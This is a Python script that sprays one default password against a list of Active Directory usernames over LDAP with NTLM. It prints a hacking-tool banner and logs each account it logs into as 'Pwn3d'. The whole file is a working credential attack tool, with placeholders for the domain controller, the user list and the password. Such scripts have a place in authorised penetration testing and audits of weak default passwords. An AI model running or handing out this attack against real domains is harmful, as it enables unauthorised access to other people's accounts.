from ldap3 import Server, Connection, ALL, NTLM
import time

# Deppendencies
# Install LDAP3 (pip install ldap3)

# Instructions:
# Change the following according to your needs:
# 
# Place where the userlist is located:
#SourceList = open("path/users.txt", "r")

# change 'domain-controller.local' to the domain controller IP or FQDN
# server = Server('domaincontroller', use_ssl=True)   
  
# Here goes the password  
# SenhaAD = "StrongP@ssword!"

# Here is the domain address: DOMAIN.LOCAL, change to your needs
# conn = Connection(server, user="DOMAIN.LOCAL\\"+UsuariosAD, password=SenhaAD, authentication=NTLM, auto_bind=True)

# Path to save sucessful attempts
# with open("path/success-login.txt", "a") as myfile:

# path to save failed attempts
# with open("path/failed-login.txt", "a") as myfile:


# Banner

print("")
print(" _   _                          _           _          ")
print("| \ | |                        | |         | |         ")        
print("|  \| | ___   ___ ___ _ __ __ _| |     __ _| |__  ___  ")
print("|   ` |/ _ \ / __/ _ \ '__/ _` | |    / _` | '_ \/ __| ")
print("| |\  | (_) | (_|  __/ | | (_| | |___| (_| | |_) \__|  ")
print("\_| \_/\___/ \___\___|_|  \__,_\_____/\__,_|_.__/|___/ ")
print("                                                       ")                                                     
print("")
print("[!] Testing user credentials against default passwords!")
print("")

count = 0
SourceList = open("path/users.txt", "r")


for line in SourceList:
    try:
        server = Server('domaincontroller', use_ssl=True)       
        UsuariosAD = "{}".format(line.strip())
        SenhaAD = "StrongP@ssword!"
        count += 1
        conn = Connection(server, user="DOMAIN.LOCAL\\"+UsuariosAD, password=SenhaAD, authentication=NTLM, auto_bind=True)
        print("[+] The user "+UsuariosAD+ " has been Pwn3d!")
        with open("path/success-login.txt", "a") as myfile:
            myfile.write("[+] The user "+UsuariosAD+ " has been Pwn3d! \n")
        time.sleep(1)
        conn.unbind()
        #Se precisar verificar o Status da conexao:
        #print(conn) 
        #Se precisar rodar o comando WHO AM I:
        #conn.extend.standard.who_am_i()   
    except:
        print("[-] The login attempt for: "+UsuariosAD+ " has failed!")
        with open("path/failed-login.txt", "a") as myfile:
            myfile.write("[-] The login attempt for: "+UsuariosAD+ " has failed! \n")        
SourceList.close()
